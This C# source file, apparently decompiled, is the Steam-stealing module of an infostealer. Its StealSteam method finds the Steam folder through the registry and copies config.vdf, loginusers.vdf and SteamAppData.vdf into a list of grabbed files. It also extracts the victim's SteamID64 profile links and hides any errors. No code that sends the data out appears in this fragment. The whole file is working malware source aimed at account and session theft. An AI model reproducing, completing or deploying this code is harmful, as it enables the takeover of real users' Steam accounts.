using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;

namespace hostik;

internal class St
{
	public static List<string> steamlist = new List<string>();

	public static List<GrabberFileInfo> gr_s = new List<GrabberFileInfo>();

	public static void StealSteam()
	{
		try
		{
			object value = Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Valve\\Steam", "Steampath", null);
			if (value == null)
			{
				return;
			}
			string? text = value.ToString();
			StringBuilder stringBuilder = new StringBuilder();
			string empty = string.Empty;
			string text2 = text;
			for (int i = 0; i < text2.Length; i++)
			{
				char value2 = text2[i];
				if (!value2.Equals('/'))
				{
					stringBuilder.Append(value2);
				}
				else
				{
					stringBuilder.Append("\\");
				}
			}
			empty = stringBuilder.ToString();
			if (Directory.Exists(empty))
			{
				string[] files = Directory.GetFiles(empty, "ssfn*");
				for (int i = 0; i < files.Length; i++)
				{
					Path.GetFileName(files[i]);
				}
				if (File.Exists(empty + "\\config\\config.vdf"))
				{
					byte[] file = File.ReadAllBytes(empty + "\\config\\config.vdf");
					gr_s.Add(new GrabberFileInfo
					{
						File = file,
						name = "Steam\\Config\\config.vdf"
					});
				}
				if (File.Exists(empty + "\\config\\loginusers.vdf"))
				{
					byte[] file2 = File.ReadAllBytes(empty + "\\config\\loginusers.vdf");
					gr_s.Add(new GrabberFileInfo
					{
						File = file2,
						name = "Steam\\Config\\loginusers.vdf"
					});
				}
				if (File.Exists(empty + "\\Config\\SteamAppData.vdf"))
				{
					byte[] file3 = File.ReadAllBytes(empty + "\\Config\\SteamAppData.vdf");
					gr_s.Add(new GrabberFileInfo
					{
						File = file3,
						name = "Steam\\Config\\SteamAppData.vdf"
					});
				}
				List<string> list = (from Match x in Regex.Matches(File.ReadAllText(empty + "\\config\\loginusers.vdf"), "\\\"76(.*?)\\\"")
					select "76" + x.Groups[1].Value).ToList();
				for (int j = 0; j < list.Count(); j++)
				{
					steamlist.Add("https://steamcommunity.com/profiles/" + list[j] + "\n");
				}
			}
		}
		catch (Exception)
		{
		}
	}
}
